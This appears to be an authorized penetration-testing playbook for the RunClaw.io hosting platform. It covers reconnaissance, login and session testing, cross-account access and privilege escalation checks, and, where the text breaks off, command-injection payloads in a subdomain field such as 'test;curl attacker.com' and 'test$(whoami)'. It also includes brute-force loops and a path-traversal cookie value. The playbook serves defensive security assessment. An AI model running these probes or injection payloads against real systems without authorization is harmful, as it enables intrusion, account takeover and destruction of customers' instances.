# RunClaw.io Penetration Testing Playbook

## Document Control

| Field | Value |
|-------|-------|
| Classification | CONFIDENTIAL - Authorized Personnel Only |
| Version | 1.0 |
| Last Updated | 2026-02-03 |
| Scope | RunClaw.io managed hosting platform |
| Authorization | Requires written authorization from RunClaw.io management before execution |

## Legal Notice

This playbook is for **authorized ethical security assessment only**. All testing must be conducted under a signed Rules of Engagement (RoE) document. Unauthorized use of these techniques against any system is illegal. Testers must have explicit written permission before executing any test described herein.

---

## Target Platform Overview

RunClaw.io is a managed hosting platform for OpenClaw (open-source personal AI agent). Users subscribe, RunClaw provisions a hardened VPS with OpenClaw pre-configured, and users access it via `username.runclaw.io`.

**Technology Stack:**

| Layer | Technology |
|-------|-----------|
| Frontend/API | Next.js 14 on Vercel |
| Auth/Database | Appwrite Cloud |
| Payments | Stripe (subscriptions, webhooks) |
| VPS Provisioning | Hetzner Cloud API |
| DNS | Cloudflare (wildcard subdomain routing, proxied) |
| On-VPS | Docker Compose (Caddy reverse proxy + OpenClaw container) |

**Key API Endpoints:**

| Route | Method | Auth |
|-------|--------|------|
| `/api/instances/create` | POST | Session cookie |
| `/api/instances/delete` | POST | Session cookie |
| `/api/instances/list` | GET | Session cookie |
| `/api/instances/ready` | POST | callback_secret (per-instance) |
| `/api/stripe/webhook` | POST | Stripe signature |
| `/api/stripe/portal` | POST | Session cookie |
| `/api/cron/health` | GET | CRON_SECRET bearer token |
| `/api/cron/reconcile` | GET | CRON_SECRET bearer token |
| `/api/cron/provision-timeout` | GET | CRON_SECRET bearer token |

**Appwrite Collections:** `users`, `instances`, `webhook_events`, `instance_events`

**Instance Naming:** Hetzner servers named `claw-{subdomain}`, DNS as `{subdomain}.runclaw.io`

---

## Phase 1: Reconnaissance

### 1.1 Subdomain Enumeration

**Objective:** Discover all subdomains under `*.runclaw.io` to map the attack surface, identify customer instances, and find hidden admin or staging endpoints.

**Prerequisites:** Internet access, subfinder, amass, httpx installed.

**Steps:**

1. Run passive subdomain enumeration:
   ```bash
   subfinder -d runclaw.io -all -o recon/subdomains-subfinder.txt
   ```

2. Run amass for broader passive enumeration:
   ```bash
   amass enum -passive -d runclaw.io -o recon/subdomains-amass.txt
   ```

3. Merge and deduplicate:
   ```bash
   sort -u recon/subdomains-subfinder.txt recon/subdomains-amass.txt > recon/subdomains-all.txt
   ```

4. Probe for live hosts:
   ```bash
   httpx -l recon/subdomains-all.txt -status-code -title -tech-detect \
     -o recon/subdomains-live.txt
   ```

5. Attempt zone transfer (unlikely but check):
   ```bash
   dig axfr runclaw.io @ns1.runclaw.io
   dig axfr runclaw.io @ns2.runclaw.io
   ```

6. Check Certificate Transparency logs:
   ```bash
   curl -s "https://crt.sh/?q=%.runclaw.io&output=json" | \
     jq -r '.[].name_value' | sort -u > recon/subdomains-ct.txt
   ```

**Expected Result (Secure):** Only expected subdomains appear (customer instances, www, app). No admin/staging/internal subdomains exposed. Zone transfers refused.

**Expected Result (Vulnerable):** Staging environments discovered (e.g., `staging.runclaw.io`, `admin.runclaw.io`). Internal services exposed. Zone transfer succeeds revealing all records.

**Evidence Collection:** Save all tool output files. Screenshot any unexpected subdomains. Record timestamps.

**Severity if Found:** Information Disclosure via exposed staging/admin: CVSS 5.3 (Medium). Zone transfer: CVSS 7.5 (High).

---

### 1.2 Technology Fingerprinting

**Objective:** Identify exact versions of Next.js, Vercel configuration, Appwrite endpoints, and other technologies to find known CVEs.

**Prerequisites:** curl, whatweb, wappalyzer (browser extension), nuclei.

**Steps:**

1. Fingerprint the main site:
   ```bash
   whatweb https://runclaw.io -v > recon/whatweb-main.txt
   ```

2. Check response headers for technology leakage:
   ```bash
   curl -sI https://runclaw.io | tee recon/headers-main.txt
   ```

3. Look for Next.js build identifiers:
   ```bash
   curl -s https://runclaw.io/_next/data/ 2>&1 | head -50
   curl -s https://runclaw.io/__nextjs_original-stack-frame 2>&1
   ```

4. Check for Vercel-specific headers:
   ```bash
   curl -sI https://runclaw.io | grep -i "x-vercel\|x-powered-by\|server"
   ```

5. Identify Appwrite endpoint:
   ```bash
   curl -s https://runclaw.io | grep -i "appwrite\|cloud.appwrite.io"
   ```

6. Check source maps availability:
   ```bash
   # Find JS bundle URLs from page source
   curl -s https://runclaw.io | grep -oP '/_next/static/[^"]+\.js' | head -20
   # Try appending .map to each
   curl -sI "https://runclaw.io/_next/static/chunks/main-HASH.js.map"
   ```

7. Run nuclei for known technology CVEs:
   ```bash
   nuclei -u https://runclaw.io -t technologies/ -o recon/nuclei-tech.txt
   ```

**Expected Result (Secure):** Minimal version information in headers. Source maps not accessible. `X-Powered-By` header removed. No Appwrite project ID visible in client-side source.

**Expected Result (Vulnerable):** Exact Next.js version disclosed. Source maps accessible revealing source code. Appwrite project ID and endpoint visible in client JS bundles. Vercel deployment metadata exposed.

**Evidence Collection:** Save all headers, source map responses, and nuclei output.

**Severity if Found:** Version disclosure: CVSS 3.1 (Low). Source map exposure: CVSS 6.5 (Medium). Appwrite credentials in client code: CVSS 8.1 (High).

---

### 1.3 API Endpoint Discovery

**Objective:** Map all API endpoints including undocumented ones.

**Prerequisites:** curl, ffuf, Burp Suite.

**Steps:**

1. Enumerate known endpoints:
   ```bash
   for path in instances/create instances/delete instances/list instances/ready \
     stripe/webhook stripe/portal cron/health cron/reconcile cron/provision-timeout; do
     echo "Testing /api/$path"
     curl -sI "https://runclaw.io/api/$path" | head -5
   done
   ```

2. Fuzz for undocumented API routes:
   ```bash
   ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u "https://runclaw.io/api/FUZZ" \
     -mc 200,201,301,302,403,405 \
     -o recon/api-fuzz.json
   ```

3. Fuzz instance sub-routes:
   ```bash
   ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "https://runclaw.io/api/instances/FUZZ" \
     -mc 200,201,301,302,403,405 \
     -o recon/api-instances-fuzz.json
   ```

4. Check for debug/admin endpoints:
   ```bash
   for path in api/admin api/debug api/health api/status api/metrics \
     api/graphql api/v1 api/v2 _debug __debug .env env.json; do
     STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://runclaw.io/$path")
     echo "$STATUS $path"
   done
   ```

5. Inspect Next.js route manifest (if exposed):
   ```bash
   curl -s "https://runclaw.io/_next/routes-manifest.json"
   curl -s "https://runclaw.io/_next/build-manifest.json"
   ```

**Expected Result (Secure):** Only documented endpoints respond. Debug/admin endpoints return 404. Route manifests not accessible.

**Expected Result (Vulnerable):** Undocumented admin or debug endpoints found. Route manifests exposed revealing all application routes.

**Evidence Collection:** Save all ffuf output and response codes.

**Severity if Found:** Undocumented admin endpoint: CVSS 7.5 (High). Route manifest exposure: CVSS 4.3 (Medium).

---

### 1.4 Hetzner Infrastructure Discovery

**Objective:** Identify customer VPS instances via internet scanning services to assess whether direct IP access bypasses Cloudflare.

**Prerequisites:** Shodan CLI (API key), censys CLI, nmap.

**Steps:**

1. Search Shodan for RunClaw servers:
   ```bash
   shodan search "runclaw" --fields ip_str,port,org,os > recon/shodan-runclaw.txt
   shodan search "claw-" "Hetzner" --fields ip_str,port,org > recon/shodan-claw.txt
   ```

2. Search by Hetzner ASN for OpenClaw signatures:
   ```bash
   shodan search "org:Hetzner openclaw" > recon/shodan-hetzner-openclaw.txt
   shodan search "org:Hetzner Caddy" "runclaw" > recon/shodan-hetzner-caddy.txt
   ```

3. Search Censys for runclaw.io certificates:
   ```bash
   censys search "runclaw.io" --index-type hosts > recon/censys-runclaw.txt
   ```

4. Check if discovered IPs respond directly (bypassing Cloudflare):
   ```bash
   # For each discovered IP:
   curl -sk "https://<IP>/" -H "Host: test.runclaw.io" -o /dev/null -w "%{http_code}"
   curl -sk "http://<IP>/" -H "Host: test.runclaw.io" -o /dev/null -w "%{http_code}"
   ```

5. Scan a discovered IP for open ports:
   ```bash
   nmap -sT -p- --min-rate 1000 -oN recon/nmap-instance.txt <TARGET_IP>
   ```

**Expected Result (Secure):** Direct IP access returns error or redirect. Only ports 80, 443, and 22 open. SSH does not accept password auth. Cloudflare proxy cannot be bypassed.

**Expected Result (Vulnerable):** Direct IP access serves the application (Cloudflare bypass). Additional ports open beyond 80/443/22. SSH accepts password auth.

**Evidence Collection:** Save all Shodan/Censys results. Screenshot direct IP responses. Save nmap scan output.

**Severity if Found:** Cloudflare bypass: CVSS 6.5 (Medium). Open extra ports: CVSS 5.3 (Medium). SSH password auth: CVSS 7.5 (High).

---

### 1.5 SSL/TLS Certificate Analysis

**Objective:** Assess TLS configuration strength and certificate chain validity.

**Prerequisites:** testssl.sh, openssl.

**Steps:**

1. Run comprehensive TLS scan:
   ```bash
   testssl.sh --html https://runclaw.io > recon/tls-main.html
   ```

2. Check certificate details:
   ```bash
   echo | openssl s_client -connect runclaw.io:443 -servername runclaw.io 2>/dev/null | \
     openssl x509 -noout -text > recon/cert-main.txt
   ```

3. Check wildcard certificate scope:
   ```bash
   echo | openssl s_client -connect runclaw.io:443 -servername test.runclaw.io 2>/dev/null | \
     openssl x509 -noout -subject -ext subjectAltName
   ```

4. Test a customer subdomain TLS directly (bypassing Cloudflare if IP known):
   ```bash
   echo | openssl s_client -connect <VPS_IP>:443 -servername test.runclaw.io 2>/dev/null | \
     openssl x509 -noout -text > recon/cert-vps.txt
   ```

**Expected Result (Secure):** TLS 1.2+ only. Strong cipher suites. Valid certificate chain. HSTS header present. No expired or self-signed certificates on VPS.

**Expected Result (Vulnerable):** TLS 1.0/1.1 supported. Weak cipher suites. Missing HSTS. Self-signed certificates on VPS allowing MITM.

**Evidence Collection:** Save testssl output and certificate details.

**Severity if Found:** Weak TLS: CVSS 5.3 (Medium). Missing HSTS: CVSS 4.3 (Medium).

---

### 1.6 OSINT on Infrastructure

**Objective:** Gather publicly available information about RunClaw.io infrastructure from code repositories, error messages, and public records.

**Prerequisites:** Web browser, GitHub access.

**Steps:**

1. Search GitHub for RunClaw references:
   ```bash
   # Search for leaked secrets or config
   # Use GitHub web search: "runclaw.io" OR "HETZNER_API_TOKEN" OR "APPWRITE_API_KEY"
   ```

2. Check for exposed `.env` files:
   ```bash
   curl -s "https://runclaw.io/.env"
   curl -s "https://runclaw.io/.env.local"
   curl -s "https://runclaw.io/.env.production"
   ```

3. Check robots.txt and sitemap:
   ```bash
   curl -s "https://runclaw.io/robots.txt"
   curl -s "https://runclaw.io/sitemap.xml"
   ```

4. Check for Vercel deployment metadata:
   ```bash
   curl -s "https://runclaw.io/.vercel/output/config.json"
   curl -s "https://runclaw.io/api/__deployment"
   ```

5. Check DNS records for infrastructure details:
   ```bash
   dig ANY runclaw.io
   dig TXT runclaw.io
   dig MX runclaw.io
   dig NS runclaw.io
   ```

6. Check WHOIS for registration details:
   ```bash
   whois runclaw.io > recon/whois.txt
   ```

**Expected Result (Secure):** No secrets in public repos. `.env` files not accessible. No internal paths leaked in error messages. WHOIS privacy enabled.

**Expected Result (Vulnerable):** API keys or secrets found in GitHub. `.env` files accessible. Error messages reveal internal paths or stack traces.

**Evidence Collection:** Save all findings with timestamps. Screenshot any exposed secrets.

**Severity if Found:** Exposed secrets: CVSS 9.8 (Critical). Internal path disclosure: CVSS 3.1 (Low).

---

## Phase 2: Authentication Testing

### 2.1 Credential Stuffing

**Objective:** Test whether the login endpoint is protected against credential stuffing attacks using known breached credential lists.

**Prerequisites:** Burp Suite, credential list (test set only), authorized test accounts.

**Steps:**

1. Identify the login mechanism. Appwrite uses `POST /v1/account/sessions/email`:
   ```bash
   # Capture a legitimate login request via Burp proxy
   curl -X POST "https://cloud.appwrite.io/v1/account/sessions/email" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Content-Type: application/json" \
     -d '{"email":"test@example.com","password":"testpass123"}'
   ```

2. Record the response time for valid vs invalid emails:
   ```bash
   # Valid email, wrong password
   time curl -s -o /dev/null -w "%{http_code}" -X POST \
     "https://cloud.appwrite.io/v1/account/sessions/email" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Content-Type: application/json" \
     -d '{"email":"known-valid@example.com","password":"wrongpass"}'

   # Invalid email
   time curl -s -o /dev/null -w "%{http_code}" -X POST \
     "https://cloud.appwrite.io/v1/account/sessions/email" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Content-Type: application/json" \
     -d '{"email":"nonexistent-user-xyz@example.com","password":"wrongpass"}'
   ```

3. Send 20 rapid failed login attempts for a single account:
   ```bash
   for i in $(seq 1 20); do
     RESP=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" -X POST \
       "https://cloud.appwrite.io/v1/account/sessions/email" \
       -H "X-Appwrite-Project: <PROJECT_ID>" \
       -H "Content-Type: application/json" \
       -d '{"email":"test@runclaw.io","password":"attempt'$i'"}')
     echo "Attempt $i: $RESP"
   done
   ```

4. Check if account lockout occurs after repeated failures.

5. Test rate limiting from different source IPs (if in scope).

**Expected Result (Secure):** Account lockout after 5-10 failed attempts. Rate limiting returns HTTP 429. Consistent response times for valid and invalid emails (no timing oracle). CAPTCHA or progressive delays after failures.

**Expected Result (Vulnerable):** No rate limiting. No account lockout. Timing differences reveal valid vs invalid emails. Unlimited login attempts accepted.

**Evidence Collection:** Record response codes and timing for each attempt. Screenshot lockout messages. Document rate limit headers.

**Severity if Found:** No rate limiting: CVSS 7.5 (High). Account enumeration via timing: CVSS 5.3 (Medium).

---

### 2.2 Session Token Analysis

**Objective:** Assess the entropy, predictability, and security properties of Appwrite session tokens.

**Prerequisites:** Burp Suite, two authorized test accounts.

**Steps:**

1. Create a session and capture the cookie:
   ```bash
   curl -v -X POST "https://cloud.appwrite.io/v1/account/sessions/email" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Content-Type: application/json" \
     -d '{"email":"testuser@runclaw.io","password":"<testpass>"}' \
     2>&1 | grep -i "set-cookie"
   ```

2. Collect 20+ session tokens by logging in repeatedly:
   ```bash
   for i in $(seq 1 20); do
     TOKEN=$(curl -s -X POST "https://cloud.appwrite.io/v1/account/sessions/email" \
       -H "X-Appwrite-Project: <PROJECT_ID>" \
       -H "Content-Type: application/json" \
       -d '{"email":"testuser@runclaw.io","password":"<testpass>"}' | \
       jq -r '.secret // .providerAccessToken // empty')
     echo "$TOKEN" >> auth/session-tokens.txt
     # Delete the session to allow re-login
     curl -s -X DELETE "https://cloud.appwrite.io/v1/account/sessions/current" \
       -H "X-Appwrite-Project: <PROJECT_ID>" \
       -H "Cookie: a_session_<PROJECT_ID>=$TOKEN"
   done
   ```

3. Analyze token entropy in Burp Suite Sequencer (paste tokens).

4. Check cookie attributes:
   ```bash
   # Look for these flags in Set-Cookie header:
   # - Secure (HTTPS only)
   # - HttpOnly (no JS access)
   # - SameSite=Strict or Lax
   # - Appropriate expiration
   ```

5. Test session fixation - set a known session cookie before login:
   ```bash
   curl -v -X POST "https://cloud.appwrite.io/v1/account/sessions/email" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Content-Type: application/json" \
     -H "Cookie: a_session_<PROJECT_ID>=attacker-chosen-value" \
     -d '{"email":"testuser@runclaw.io","password":"<testpass>"}' \
     2>&1 | grep -i "set-cookie"
   ```
   Verify that the server issues a NEW session token and does not reuse the attacker-chosen value.

6. Test concurrent sessions - check if old sessions are invalidated:
   ```bash
   # Login from "device A"
   TOKEN_A=$(curl -s -X POST ... | jq -r '.secret')
   # Login from "device B"
   TOKEN_B=$(curl -s -X POST ... | jq -r '.secret')
   # Check if TOKEN_A still works
   curl -s "https://cloud.appwrite.io/v1/account" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$TOKEN_A"
   ```

**Expected Result (Secure):** High entropy tokens (128+ bits). Secure, HttpOnly, SameSite flags set. Session fixation rejected (new token issued). Reasonable session expiration.

**Expected Result (Vulnerable):** Low entropy or predictable tokens. Missing cookie security flags. Session fixation possible. Sessions never expire.

**Evidence Collection:** Save token samples, Burp Sequencer analysis, cookie headers.

**Severity if Found:** Predictable tokens: CVSS 8.1 (High). Missing cookie flags: CVSS 4.3 (Medium). Session fixation: CVSS 7.5 (High).

---

### 2.3 Auth Bypass via Direct API Access

**Objective:** Test whether API endpoints can be accessed without a valid session cookie.

**Prerequisites:** curl, Burp Suite.

**Steps:**

1. Test each authenticated endpoint without any cookies:
   ```bash
   # Instance list - should require auth
   curl -s "https://runclaw.io/api/instances/list"

   # Instance create - should require auth
   curl -s -X POST "https://runclaw.io/api/instances/create" \
     -H "Content-Type: application/json" \
     -d '{"subdomain":"pentest1","plan":"starter"}'

   # Instance delete - should require auth
   curl -s -X POST "https://runclaw.io/api/instances/delete" \
     -H "Content-Type: application/json" \
     -d '{"instance_id":"some-id"}'

   # Stripe portal - should require auth
   curl -s -X POST "https://runclaw.io/api/stripe/portal"
   ```

2. Test with an expired session cookie:
   ```bash
   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=expired-or-invalid-token"
   ```

3. Test with a malformed session cookie:
   ```bash
   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=../../../etc/passwd"
   ```

4. Test access to the Appwrite API directly with the public project ID:
   ```bash
   # Try listing documents without auth (should fail)
   curl -s "https://cloud.appwrite.io/v1/databases/<DB_ID>/collections/instances/documents" \
     -H "X-Appwrite-Project: <PROJECT_ID>"

   # Try listing all users (should fail)
   curl -s "https://cloud.appwrite.io/v1/users" \
     -H "X-Appwrite-Project: <PROJECT_ID>"
   ```

**Expected Result (Secure):** All endpoints return 401 Unauthorized without valid session. Expired/malformed cookies rejected. Direct Appwrite API access without server key fails with permission errors.

**Expected Result (Vulnerable):** Endpoints return data without authentication. Expired cookies still accepted. Direct Appwrite access reveals data.

**Evidence Collection:** Record response codes and bodies for each request.

**Severity if Found:** Auth bypass on instance management: CVSS 9.1 (Critical). Direct Appwrite data access: CVSS 9.8 (Critical).

---

### 2.4 Account Enumeration via Timing

**Objective:** Determine if the application reveals whether an email address is registered through response timing differences or error message differences.

**Prerequisites:** curl, Python (for precise timing).

**Steps:**

1. Create a timing measurement script:
   ```python
   #!/usr/bin/env python3
   """Account enumeration timing test."""
   import requests
   import time
   import statistics

   APPWRITE_ENDPOINT = "https://cloud.appwrite.io/v1/account/sessions/email"
   PROJECT_ID = "<PROJECT_ID>"
   HEADERS = {
       "X-Appwrite-Project": PROJECT_ID,
       "Content-Type": "application/json"
   }

   def measure_login_time(email: str, password: str = "WrongP@ss123!") -> float:
       start = time.perf_counter()
       resp = requests.post(APPWRITE_ENDPOINT, headers=HEADERS,
                            json={"email": email, "password": password})
       elapsed = time.perf_counter() - start
       return elapsed, resp.status_code, resp.text

   # Test known-valid email (your test account)
   valid_times = []
   for _ in range(10):
       t, code, body = measure_login_time("valid-test@runclaw.io")
       valid_times.append(t)

   # Test known-invalid email
   invalid_times = []
   for _ in range(10):
       t, code, body = measure_login_time("definitely-not-real-xyz@runclaw.io")
       invalid_times.append(t)

   print(f"Valid email   - mean: {statistics.mean(valid_times):.4f}s, "
         f"stdev: {statistics.stdev(valid_times):.4f}s")
   print(f"Invalid email - mean: {statistics.mean(invalid_times):.4f}s, "
         f"stdev: {statistics.stdev(invalid_times):.4f}s")

   # Compare error messages
   _, _, valid_body = measure_login_time("valid-test@runclaw.io")
   _, _, invalid_body = measure_login_time("definitely-not-real-xyz@runclaw.io")
   print(f"\nValid email response:   {valid_body[:200]}")
   print(f"Invalid email response: {invalid_body[:200]}")
   ```

2. Run the script and analyze timing differences.

3. Check error messages for differences (e.g., "Invalid password" vs "User not found").

**Expected Result (Secure):** Consistent response times (< 50ms difference). Identical error messages for valid and invalid emails (e.g., "Invalid credentials" for both).

**Expected Result (Vulnerable):** Statistically significant timing difference (> 100ms). Different error messages revealing email existence.

**Evidence Collection:** Save timing measurements and error message comparisons.

**Severity if Found:** CVSS 5.3 (Medium).

---

## Phase 3: Authorization Testing (IDOR and Access Control)

### 3.1 Instance List Cross-Account Access

**Objective:** Verify that `GET /api/instances/list` only returns instances belonging to the authenticated user.

**Prerequisites:** Two authorized test accounts (Account A and Account B), each with at least one instance.

**Steps:**

1. Login as Account A and list instances:
   ```bash
   # Login as Account A
   RESP_A=$(curl -s -X POST "https://cloud.appwrite.io/v1/account/sessions/email" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Content-Type: application/json" \
     -d '{"email":"accountA@runclaw.io","password":"<passA>"}')
   SESSION_A=$(echo "$RESP_A" | jq -r '.secret')

   # List Account A's instances
   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_A" | jq .
   ```

2. Login as Account B and list instances:
   ```bash
   RESP_B=$(curl -s -X POST "https://cloud.appwrite.io/v1/account/sessions/email" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Content-Type: application/json" \
     -d '{"email":"accountB@runclaw.io","password":"<passB>"}')
   SESSION_B=$(echo "$RESP_B" | jq -r '.secret')

   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B" | jq .
   ```

3. Verify that Account A's instances do NOT appear in Account B's list and vice versa.

4. Record the instance IDs from both accounts for use in subsequent tests.

**Expected Result (Secure):** Each account sees only its own instances. No cross-account data leakage.

**Expected Result (Vulnerable):** Account B can see Account A's instances or vice versa.

**Evidence Collection:** Save both API responses showing distinct instance lists.

**Severity if Found:** CVSS 6.5 (Medium).

---

### 3.2 Instance Deletion Cross-Account (IDOR)

**Objective:** Verify that `POST /api/instances/delete` rejects attempts to delete another user's instance.

**Prerequisites:** Account A with instance `INSTANCE_A_ID`, Account B session token.

**Steps:**

1. Using Account B's session, attempt to delete Account A's instance:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/delete" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B" \
     -H "Content-Type: application/json" \
     -d "{\"instance_id\":\"$INSTANCE_A_ID\"}"
   ```

2. Verify Account A's instance still exists:
   ```bash
   curl -s "https://runclaw.io/api/instances/list" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_A" | jq .
   ```

3. Try various ID formats to probe for IDOR:
   ```bash
   # Try sequential IDs if format is guessable
   for id in "000000000001" "000000000002" "1" "2" "admin"; do
     curl -s -X POST "https://runclaw.io/api/instances/delete" \
       -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B" \
       -H "Content-Type: application/json" \
       -d "{\"instance_id\":\"$id\"}"
   done
   ```

**Expected Result (Secure):** Delete request for another user's instance returns 403 Forbidden or 404 Not Found. Account A's instance remains intact. The server checks `user_id` matches the authenticated user before deletion.

**Expected Result (Vulnerable):** Account B can delete Account A's instance. The server only checks if the instance exists, not ownership.

**Evidence Collection:** Record request and response for cross-account deletion attempt. Verify instance persistence via list API.

**Severity if Found:** CVSS 8.1 (High) - Unauthorized data destruction.

---

### 3.3 Ready Callback Brute Force

**Objective:** Test whether the `/api/instances/ready` callback can be exploited by guessing the instance_id and callback_secret.

**Prerequisites:** curl, knowledge of instance ID format (Appwrite unique ID).

**Steps:**

1. Attempt callback with a valid instance_id but wrong secret:
   ```bash
   curl -s -X POST "https://runclaw.io/api/instances/ready" \
     -H "Content-Type: application/json" \
     -d '{
       "instance_id": "<KNOWN_INSTANCE_ID>",
       "callback_secret": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
       "openclaw_version": "latest"
     }'
   ```

2. Attempt callback with guessed instance_id:
   ```bash
   for i in $(seq 1 100); do
     GUID=$(python3 -c "import uuid; print(uuid.uuid4().hex[:20])")
     RESP=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
       "https://runclaw.io/api/instances/ready" \
       -H "Content-Type: application/json" \
       -d "{\"instance_id\":\"$GUID\",\"callback_secret\":\"test\"}")
     echo "Attempt $i ($GUID): $RESP"
   done
   ```

3. Check for timing differences between valid instance_id (wrong secret) and invalid instance_id:
   ```bash
   # Valid instance, wrong secret
   time curl -s -X POST "https://runclaw.io/api/instances/ready" \
     -H "Content-Type: application/json" \
     -d '{"instance_id":"<VALID_ID>","callback_secret":"wrong"}'

   # Invalid instance
   time curl -s -X POST "https://runclaw.io/api/instances/ready" \
     -H "Content-Type: application/json" \
     -d '{"instance_id":"nonexistent","callback_secret":"wrong"}'
   ```

4. Check if the callback can be replayed after instance is already running:
   ```bash
   # Use the real callback_secret for an already-running instance
   curl -s -X POST "https://runclaw.io/api/instances/ready" \
     -H "Content-Type: application/json" \
     -d '{
       "instance_id": "<RUNNING_INSTANCE_ID>",
       "callback_secret": "<REAL_SECRET>",
       "openclaw_version": "latest"
     }'
   ```

**Expected Result (Secure):** Wrong secret returns 403. Invalid instance returns 404. No timing oracle. Callback rejected for non-provisioning instances. Rate limiting after repeated failures. The callback_secret is 64 hex characters (32 bytes entropy) making brute force infeasible.

**Expected Result (Vulnerable):** Timing differences reveal valid instance IDs. No rate limiting on the callback endpoint. Callback accepted for already-running instances (state manipulation).

**Evidence Collection:** Record all response codes, timing measurements, and replay results.

**Severity if Found:** Timing oracle: CVSS 5.3 (Medium). State manipulation via replay: CVSS 6.5 (Medium). Weak callback secret: CVSS 8.1 (High).

---

### 3.4 Direct Appwrite Permission Bypass

**Objective:** Test whether Appwrite document-level permissions can be bypassed via direct API access.

**Prerequisites:** Appwrite project ID (from client-side code), test account session.

**Steps:**

1. Using Account B's session, try to read Account A's instance document directly via Appwrite:
   ```bash
   curl -s "https://cloud.appwrite.io/v1/databases/<DB_ID>/collections/instances/documents/<INSTANCE_A_ID>" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B"
   ```

2. Try to update Account A's instance via Appwrite:
   ```bash
   curl -s -X PATCH \
     "https://cloud.appwrite.io/v1/databases/<DB_ID>/collections/instances/documents/<INSTANCE_A_ID>" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B" \
     -H "Content-Type: application/json" \
     -d '{"data":{"status":"running"}}'
   ```

3. Try to list ALL documents in the instances collection:
   ```bash
   curl -s "https://cloud.appwrite.io/v1/databases/<DB_ID>/collections/instances/documents" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B"
   ```

4. Try accessing admin-only collections:
   ```bash
   # webhook_events should be admin-only
   curl -s "https://cloud.appwrite.io/v1/databases/<DB_ID>/collections/webhook_events/documents" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B"

   # instance_events
   curl -s "https://cloud.appwrite.io/v1/databases/<DB_ID>/collections/instance_events/documents" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B"
   ```

5. Try to create a document directly in the instances collection:
   ```bash
   curl -s -X POST \
     "https://cloud.appwrite.io/v1/databases/<DB_ID>/collections/instances/documents" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B" \
     -H "Content-Type: application/json" \
     -d '{
       "documentId": "unique()",
       "data": {
         "user_id": "'$USER_B_ID'",
         "subdomain": "hackertest",
         "status": "running",
         "plan": "dedicated"
       }
     }'
   ```

**Expected Result (Secure):** Reading another user's document returns 401/403. Listing returns only own documents (filtered by Appwrite permissions `user:{userId}`). Admin collections return 401. Direct document creation fails or is restricted by permissions.

**Expected Result (Vulnerable):** Can read/modify other users' documents. Can list all instances across all users. Can access admin-only collections. Can create fake instance records.

**Evidence Collection:** Save all requests and responses.

**Severity if Found:** Cross-user document access: CVSS 8.1 (High). Admin collection access: CVSS 7.5 (High). Arbitrary document creation: CVSS 9.1 (Critical).

---

### 3.5 Vertical Privilege Escalation

**Objective:** Test whether a regular user can escalate to admin-level access.

**Prerequisites:** Regular test account, knowledge of Appwrite teams/roles structure.

**Steps:**

1. Check if the user can enumerate Appwrite teams:
   ```bash
   curl -s "https://cloud.appwrite.io/v1/teams" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B"
   ```

2. Try to join the admin team:
   ```bash
   curl -s -X POST "https://cloud.appwrite.io/v1/teams/admins/memberships" \
     -H "X-Appwrite-Project: <PROJECT_ID>" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B" \
     -H "Content-Type: application/json" \
     -d '{"email":"accountB@runclaw.io","roles":["admin"]}'
   ```

3. Check if there are admin API routes:
   ```bash
   curl -s "https://runclaw.io/api/admin/users" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B"
   curl -s "https://runclaw.io/api/admin/instances" \
     -H "Cookie: a_session_<PROJECT_ID>=$SESSION_B"
   ```

**Expected Result (Secure):** Team enumeration restricted. Cannot join admin team. Admin routes return 403 or 404.

**Expected Result (Vulnerable):** Can enumerate teams. Can self-add to admin team. Admin routes accessible.

**Evidence Collection:** Save all requests and responses.

**Severity if Found:** CVSS 9.8 (Critical).

---

## Phase 4: Injection Testing

### 4.1 Subdomain Command Injection

**Objective:** Test whether the subdomain field is properly sanitized before being used in Hetzner API calls, Cloudflare DNS operations, and cloud-init template generation. This is a critical test because the subdomain is interpolated into a shell script (cloud-init) via string replacement.

**Prerequisites:** Authorized test account with active subscription, Burp Suite.

**Steps:**

1. Test basic command injection payloads in the subdomain field:
   ```bash
   SESSION="<valid_session_cookie>"

   PAYLOADS=(
     'test$(whoami)'
     'test$(id)'
     'test`id`'
     'test;curl attacker.com'
     'test|curl attacker.com'
     'test&&curl attacker.com'
     'test||curl attacker.com'
   )

